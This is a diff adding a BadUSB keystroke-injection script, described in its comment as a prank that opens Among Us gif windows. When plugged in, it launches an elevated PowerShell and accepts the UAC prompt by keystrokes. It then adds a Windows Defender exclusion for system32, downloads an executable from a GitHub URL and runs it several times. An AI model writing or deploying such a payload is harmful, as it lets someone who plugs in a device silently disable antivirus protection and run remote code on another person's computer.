@@ -1,0 +1,15 @@
+GUI r
+REM Spawns 10 windows of the among us gif.
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/badusb-payloads/raw/main/SUS/sus.exe';$file='sus.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);$exec.shellexecute($file);exit
+ENTER
